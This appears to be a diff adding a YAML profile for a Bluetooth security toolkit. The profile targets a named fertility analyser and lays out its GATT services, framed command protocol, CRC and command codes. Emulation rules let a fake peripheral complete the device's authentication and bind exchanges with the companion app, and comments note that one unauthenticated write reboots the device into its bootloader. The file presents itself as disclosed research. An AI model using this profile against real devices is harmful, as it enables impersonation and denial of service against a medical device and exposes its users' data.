@@ -1,0 +1,232 @@
+# BRAT device profile - Mira Ultra4 fertility analyser
+#
+# Reference profile and worked example of a `protocol:` block. Included because
+# a toolkit that only ships generic machinery gives you nothing to read; this
+# shows what a complete profile looks like once you have reverse engineered a
+# device's framing.
+#
+# SCRUBBED. Every value here is either a structural constant or synthetic.
+# No account identifiers, tokens, or measurement data from any real session
+# appear in this file, and none should be added to it.
+#
+# The GATT tree is transcribed from a published handle map, not from a live
+# clone. Regenerate it against your own unit for an exact tree:
+#
+#   brat clone --address <YOUR_DEVICE_MAC> --slug mira_ultra4
+#
+# Disclosure: the weaknesses this profile exercises were reported to the vendor
+# and to regulators, and several are fixed in current production firmware. The
+# profile is published to demonstrate the *class* of flaw, not to attack
+# shipping devices. Use it against a unit you own.
+
+brat_profile_version: 1
+
+device:
+  slug: mira_ultra4
+  name: Mira Ultra4
+  vendor: Quanovate
+  model: Ultra4
+  source: transcribed from published GATT handle map; protocol block hand-authored
+  notes: >
+    Nordic nRF52-based analyser. Application traffic is a framed protocol
+    carried over Nordic UART Service; GATT itself enforces nothing. The device
+    also exposes a Nordic Buttonless Secure DFU characteristic that accepts an
+    unauthenticated write to trigger a reboot into bootloader.
+
+# ---------------------------------------------------------------------------
+# Recognising the device in a scan.
+# Service UUIDs are weighted above the name, because a name is trivially
+# spoofed - which is the entire point of `brat impersonate`.
+# ---------------------------------------------------------------------------
+match:
+  name: Mira-Analyzer
+  service_uuids:
+    - 6e400001-b5a3-f393-e0a9-e50e24dcca9e
+
+advertising:
+  local_name: Mira-Analyzer
+  service_uuids:
+    - 6e400001-b5a3-f393-e0a9-e50e24dcca9e
+
+# ---------------------------------------------------------------------------
+# What this device *should* do. Posture findings are the gap between these
+# expectations and observed behaviour.
+# ---------------------------------------------------------------------------
+security:
+  expect_encryption: true
+  expect_pairing: true
+  expect_bonding: true
+  sensitive_characteristics:
+    - 6e400002-b5a3-f393-e0a9-e50e24dcca9e   # command ingress
+    - 6e400003-b5a3-f393-e0a9-e50e24dcca9e   # measurement egress
+    - 8ec90003-f315-4f60-9fb8-838830daea50   # bootloader trigger
+  observed:
+    att_mtu: 247
+    address_type: unknown
+    link_encrypted: false
+    pairing_required: false
+
+gatt:
+  services:
+    - uuid: 00001800-0000-1000-8000-00805f9b34fb
+      name: Generic Access
+      primary: true
+      handle: 1
+      characteristics:
+        - uuid: 00002a00-0000-1000-8000-00805f9b34fb
+          name: Device Name
+          properties: [read]
+          value: 4d6972612d416e616c797a6572          # "Mira-Analyzer"
+        - uuid: 00002a01-0000-1000-8000-00805f9b34fb
+          name: Appearance
+          properties: [read]
+          value: "0000"
+
+    - uuid: 00001801-0000-1000-8000-00805f9b34fb
+      name: Generic Attribute
+      primary: true
+      handle: 10
+      characteristics: []
+
+    # Nordic Secure DFU. attack_11 confirmed that writing 0x01 to the buttonless
+    # characteristic reboots the device into its bootloader with no credential
+    # of any kind - a remote denial of service against a medical device.
+    - uuid: 0000fe59-0000-1000-8000-00805f9b34fb
+      name: Nordic Secure DFU
+      primary: true
+      handle: 11
+      characteristics:
+        - uuid: 8ec90003-f315-4f60-9fb8-838830daea50
+          name: Buttonless DFU (unbonded)
+          properties: [write, indicate]
+          handle: 13
+          notes: Nordic Buttonless DFU (unbonded)
+          descriptors:
+            - uuid: 00002902-0000-1000-8000-00805f9b34fb
+              name: Client Characteristic Configuration
+
+    # Nordic UART Service. Everything the application does rides on this.
+    - uuid: 6e400001-b5a3-f393-e0a9-e50e24dcca9e
+      name: Nordic UART Service (NUS)
+      primary: true
+      handle: 15
+      characteristics:
+        - uuid: 6e400002-b5a3-f393-e0a9-e50e24dcca9e
+          name: NUS RX (central writes here)
+          properties: [write, write-without-response]
+          handle: 17
+          notes: command ingress - phone to device
+        - uuid: 6e400003-b5a3-f393-e0a9-e50e24dcca9e
+          name: NUS TX (peripheral notifies here)
+          properties: [notify]
+          handle: 19
+          notes: response egress - device to phone
+          descriptors:
+            - uuid: 00002902-0000-1000-8000-00805f9b34fb
+              name: Client Characteristic Configuration
+
+# ---------------------------------------------------------------------------
+# Application-layer protocol.
+#
+# This is the part GATT enumeration cannot see. The frame is fixed-layout:
+#
+#   A5 00 <dir> D0 E0 <cmd> <len:u16be> <payload...> <crc16:be> 5A
+#
+# The checksum is CRC-16/MODBUS over everything from the start byte through the
+# payload, serialised big-endian. Note that the length is a full 16-bit field:
+# most commands are short enough that the high byte reads as a constant 0x00,
+# which is easy to misread as padding until a large response arrives.
+# ---------------------------------------------------------------------------
+protocol:
+  name: mira-a5
+  description: >
+    Framed command protocol over NUS. No nonce, no signature, no session
+    binding - a frame with a valid CRC is accepted on its merits, in either
+    direction.
+
+  # Which characteristics carry this protocol. Worth declaring explicitly here
+  # because the device also exposes an indicating DFU characteristic, and an
+  # engine left to guess a response channel could pick the wrong one.
+  transport:
+    write_uuid: 6e400002-b5a3-f393-e0a9-e50e24dcca9e
+    notify_uuid: 6e400003-b5a3-f393-e0a9-e50e24dcca9e
+
+  frame:
+    fields:
+      - {name: start,     type: const,  value: "A5"}
+      - {name: reserved,  type: const,  value: "00"}
+      - {name: direction, type: u8,     default: 0, description: "0=central, 1=ack, 2=confirm"}
+      - {name: dst,       type: const,  value: "D0"}
+      - {name: src,       type: const,  value: "E0"}
+      - {name: cmd,       type: u8}
+      - {name: length,    type: u16be,  length_of: payload}
+      - {name: payload,   type: bytes,  length_from: length}
+      - {name: crc,       type: crc}
+      - {name: end,       type: const,  value: "5A"}
+
+  crc:
+    algorithm: crc16-ibm        # CRC-16/MODBUS: poly 0x8005 reflected, init 0xFFFF
+    byte_order: big
+    covers: [start, reserved, direction, dst, src, cmd, length, payload]
+
+  commands:
+    0x90: BIND
+    0x91: KEEPALIVE
+    0x92: DATA_SYNC
+    0x93: MEASUREMENT_DATA
+    0x96: UNBIND
+    0xA3: AUTH
+    0xA4: AUTH_CONFIRM
+    0xA8: DISCONNECT
+
+  emulation:
+    variables:
+      # Synthetic bind token. Deliberately recognisable so it can be spotted if
+      # the client echoes it back in a later frame - which is how you confirm
+      # the client accepted a value it never should have trusted.
+      bind_device: "DEADBEEFCAFE0001"
+      # Firmware version bytes the real analyser reports. A product constant,
+      # not per-unit data.
+      firmware_version: "01070147"
+
+    rules:
+      # Auth. The client sends its account identifier in the clear and the
+      # device simply acknowledges it - there is nothing to verify against, so
+      # any peripheral can complete this exchange.
+      - name: auth
+        on_cmd: 0xA3
+        description: echo the identifier back as accepted, then confirm the bind
+        respond:
+          - label: A3-ack
+            delay: 0.15
+            direction: 0x01
+            cmd: 0xA3
+            payload: "{req.payload[0:8]}01"
+          - label: A4-confirm
+            delay: 1.2
+            direction: 0x02
+            cmd: 0xA4
+            payload: "{req.payload[0:8]}{var.bind_device}{ts:u32be}{req.payload[12:14]}"
+
+      # Bind. Acknowledging this suppresses the physical button confirmation
+      # the real device would require, so the session proceeds unattended.
+      - name: bind
+        on_cmd: 0x90
+        description: confirm the bind, echoing back whatever token the client sent
+        respond:
+          - label: 90-ack
+            delay: 0.2
+            direction: 0x01
+            cmd: 0x90
+            payload: "{req.payload[19:27]}0E25010001 05{var.firmware_version}{ts:u32be}{req.payload[17:19]}"
+
+      # Keepalive. Bare acknowledgement; the real device's payload format for
+      # this is not documented here, so nothing is invented.
+      - name: keepalive
+        on_cmd: 0x91
+        respond:
+          - label: 91-ack
+            delay: 0.05
+            direction: 0x01
+            cmd: 0x91
+            payload: "01"
